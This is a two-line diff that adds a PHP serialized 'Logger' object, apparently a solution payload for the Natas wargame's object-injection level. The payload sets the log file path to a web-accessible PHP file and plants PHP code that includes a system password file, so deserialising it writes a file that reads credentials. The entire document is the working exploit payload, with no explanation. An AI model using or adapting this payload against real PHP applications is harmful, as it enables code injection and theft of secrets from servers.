@@ -1,0 +1,2 @@
+O:6:"Logger":3:{s:15:"�Logger�logFile";s:12:"img/give.php";s:15:"�Logger�initMsg";s:22:"#--session started--#
+";s:15:"�Logger�exitMsg";s:43:"<? include '/etc/natas_webpass/natas27'; ?>";}
